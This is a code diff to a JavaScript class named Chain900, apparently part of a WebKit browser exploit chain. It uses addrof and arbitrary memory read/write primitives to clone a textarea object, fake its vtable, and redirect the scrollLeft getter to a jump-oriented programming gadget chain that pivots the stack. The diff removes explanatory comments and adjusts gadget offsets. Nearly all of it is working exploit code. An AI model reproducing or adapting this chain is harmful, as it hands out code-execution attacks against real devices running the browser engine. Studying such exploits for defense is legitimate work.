@@ -486,50 +486,14 @@ class Chain900 extends Chain900Base {
         const vtable_size = 0x1000;
         const webcore_ta_size = 0x180;
 
-        // Empty objects have 6 inline properties that are not inspected by the
-        // GC. This gives us 48 bytes of free space that we can write with
-        // anything.
         const ta_clone = {};
         this.ta_clone = ta_clone;
         const clone_p = mem.addrof(ta_clone);
         const ta_p = mem.addrof(rop_ta);
 
-        // Copy the contents of the textarea before copying the JSCell. As long
-        // the JSCell is of an empty object, the GC will not inspect the inline
-        // storage.
-        //
-        // MarkedBlocks serve memory in fixed-size chunks (cells). The chunk
-        // size is also called the cell size. Even if you request memory whose
-        // size is less than a cell, the entire cell is allocated for the
-        // object.
-        //
-        // The cell size of the MarkedBlock where the empty object is allocated
-        // is atleast 64 bytes (enough to fit the empty object). So even if we
-        // change the JSCell later and the perceived size of the object
-        // (js_ta_size) is less than 64 bytes, we don't have to worry about the
-        // memory area between clone_p + js_ta_size and clone_p + cell_size
-        // being freed and reused because the entire cell belongs to the object
-        // until it dies.
         for (let i = js_size; i < js_ta_size; i += 8) {
             clone_p.write64(i, ta_p.read64(i));
         }
-
-        // JSHTMLTextAreaElement is a subclass of JSC::JSDestructibleObject and
-        // thus they are allocated on a MarkedBlock with special attributes
-        // that tell the GC to have their destructor clean their storage on
-        // their death.
-        //
-        // The destructor in this case will destroy m_wrapped since they are a
-        // subclass of WebCore::JSDOMObject as well.
-        //
-        // What's great about the clones (initially empty objects) is that they
-        // are instances of JSC::JSFinalObject. That type doesn't have a
-        // destructor and so they are allocated on MarkedBlocks that don't need
-        // destruction.
-        //
-        // So even if a clone dies, the GC will not look for a destructor and
-        // try to run it. This means we can fake m_wrapped and not fear of any
-        // sort of destructor being called on it.
 
         const webcore_ta = ta_p.readp(offset_textarea_impl);
         const m_wrapped_clone = new Uint8Array(
@@ -554,18 +518,10 @@ class Chain900 extends Chain900Base {
         );
         rw.write64(m_wrapped_clone, 0, get_view_vector(vtable_clone));
 
-        // turn the empty object into a textarea (copy JSCell header)
-        //
-        // Don't need to copy the butterfly since it's by default NULL and it
-        // doesn't have any special meaning for the JSHTMLTextAreaObject type,
-        // unlike other types that uses it for something else.
-        //
-        // An example is a JSArrayBufferView with m_mode >= WastefulTypedArray,
-        // their *(butterfly - 8) is a pointer to a JSC::ArrayBuffer.
         clone_p.write64(0, ta_p.read64(0));
 
-        // 0x1c8 is the offset of the scrollLeft getter native function
-        rw.write64(vtable_clone, 0x1c8, this.get_gadget(jop1));
+        // 0x1b8 is the offset of the scrollLeft getter native function
+        rw.write64(vtable_clone, 0x1b8, this.get_gadget(jop1));
 
         // for the JOP chain
         const rax_ptrs = new Uint8Array(0x100);
@@ -573,8 +529,8 @@ class Chain900 extends Chain900Base {
         this.rax_ptrs = rax_ptrs;
 
         rw.write64(rax_ptrs, 0x28, this.get_gadget(jop2));
-        rw.write64(rax_ptrs, 0x5f, this.get_gadget(jop3));
-        rw.write64(rax_ptrs, 0x30, this.get_gadget(jop4));
+        rw.write64(rax_ptrs, 0x1c, this.get_gadget(jop3));
+        rw.write64(rax_ptrs, 0x58, this.get_gadget(jop4));
         rw.write64(rax_ptrs, 0x10, this.get_gadget(jop5));
         rw.write64(rax_ptrs, 0, this.get_gadget(jop6));
         // value to pivot rsp to
@@ -586,15 +542,6 @@ class Chain900 extends Chain900Base {
 
         rw.write64(jop_buffer, 0, rax_ptrs_p);
 
-        // Write the needed data by the JOP chain (mov rdi, qword ptr [rsi +
-        // 0x20]) at offset 0x20 (3rd inline property of the empty object) from
-        // the address of the cloned textarea.
-        //
-        // We could have passed the data by another offset like via the
-        // m_classInfo field ([rsi + 0x10]) but the contents of a
-        // JSHTMLTextAreaElement is not safe to change since it is used by the
-        // GC. Even if we restore them immediately, there is a small time frame
-        // where the GC could use the invalid contents.
         clone_p.write64(offset_js_inline_prop + 8*2, jop_buffer_p);
     }
 
